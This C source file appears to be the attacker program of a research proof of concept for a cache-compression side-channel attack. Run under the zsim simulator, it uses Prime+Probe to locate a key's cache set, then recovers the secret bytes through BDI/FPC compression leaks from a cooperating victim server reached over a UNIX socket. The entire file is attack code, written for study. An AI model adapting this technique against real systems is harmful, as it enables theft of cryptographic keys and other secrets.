#include <sys/socket.h>
#include <sys/un.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <stdio.h>
#include <unistd.h>
#include "interface.h"
#include "../common/cache_manipulation.h"

#include "../common/zsim_hooks.h"
#include "../bdi_exploit/steal_bytes.h"

#define LINESIZE 64

long KEYSET;
int KEYSIZE;

int data_socket;

void send_buffer(char *to_send);
unsigned observe_modifications();
void accessKey();

void dummyAccess(){
  unsigned char buffer[BUFFERSIZE];
  bzero(buffer, BUFFERSIZE);
  buffer[0] = DUMMY_ACCESS;
  int _r = write(data_socket, buffer, BUFFERSIZE);
  // Wait response
  _r = read(data_socket, buffer, BUFFERSIZE);
}

void connect_socket(int *sock, char *socket_name) {
  int ret;
  struct sockaddr_un addr;

  /* Create local socket. */

  *sock = socket(AF_UNIX, SOCK_SEQPACKET, 0);
  if (*sock == -1) {
    perror("sock");
    exit(EXIT_FAILURE);
  }

  /*
   * For portability clear the whole structure, since some
   * implementations have additional (nonstandard) fields in
   * the structure.
   */
  memset(&addr, 0, sizeof(struct sockaddr_un));

  /* Connect socket to socket address */

  addr.sun_family = AF_UNIX;
  strncpy(addr.sun_path, socket_name, sizeof(addr.sun_path) - 1);

  zsim_roi_begin();

  ret = connect (*sock, (const struct sockaddr *) &addr,
		 sizeof(struct sockaddr_un));
  if (ret == -1) {
    fprintf(stderr, "[A] The server is down.\n");
    exit(EXIT_FAILURE);
  }
}

void flush(){
  unsigned char buffer[BUFFERSIZE];
  bzero(buffer, BUFFERSIZE);
  buffer[0] = FLUSH;
  int _r = write(data_socket, buffer, BUFFERSIZE);
  // Wait response
  _r = read(data_socket, buffer, BUFFERSIZE);
}

void get_key_set(){ // Using Prime+Probe technique
  KEYSET = get_set(&flush, &accessKey, &dummyAccess);
  printf("[A] Set where the key is: %ld\n", KEYSET);
}

int main(int argc, char *argv[]){
  KEYSIZE = argc > 1 ? atoi(argv[1]) : 4;

  connect_socket(&data_socket, SOCKET_NAME);
  get_key_set();

  // Set initial values around the key, then guess it by BDI exploit
  unsigned char buffer[BUFFERSIZE];
  bzero(buffer, BUFFERSIZE);
  // Use a pseudorandom input array to make line not compressible
  for (int i = 0; i < BUFFERSIZE; i++) { buffer[i] = i*41+51%256; }
  printf("[A] Key line compressed size: %u\n", observe_modifications(buffer));
  unsigned char answer[KEYSIZE];
  bzero(answer, KEYSIZE);
  // Call to the process to get the secret
  // The last argument is the compression algorithm with:
  // 0 -> BDI
  // 1 -> FPC
  // Don't forget to include the correct from bdi_exploit/steal_bytes.c or fpc_exploit/steal_bytes.c from the top!
  steal(buffer, answer, &observe_modifications, &send_buffer, KEYSIZE/*, 1*/);
  
  printf("[A] Secret value is: ");
  for(int i = 0; i < KEYSIZE; i++) printf("%u,", answer[i]);
  printf("\n");


  bzero(buffer, BUFFERSIZE);
  buffer[0] = KILL;
  int _r = write(data_socket, buffer, BUFFERSIZE);
    
  close(data_socket);

  zsim_heartbeat();

  exit(EXIT_SUCCESS);
}

/* Modify the bytes adjacent to the key (to steal it) */
void send_buffer(char *to_send){
  unsigned char buffer[BUFFERSIZE];
  bzero(buffer, BUFFERSIZE);
  buffer[0] = WRITE_AROUND_KEY;
  memcpy(&buffer[1], to_send, BUFFERSIZE);
  int _r = write(data_socket, buffer, BUFFERSIZE);
}

void accessKey(){
  unsigned char buffer[BUFFERSIZE];
  bzero(buffer, BUFFERSIZE);
  buffer[0] = ACCESS_KEY;
  int _r = write(data_socket, buffer, BUFFERSIZE);
  // Wait response
  _r = read(data_socket, buffer, BUFFERSIZE);
}

unsigned observe_modifications(){
  return get_size(KEYSET, &accessKey, &flush);
}
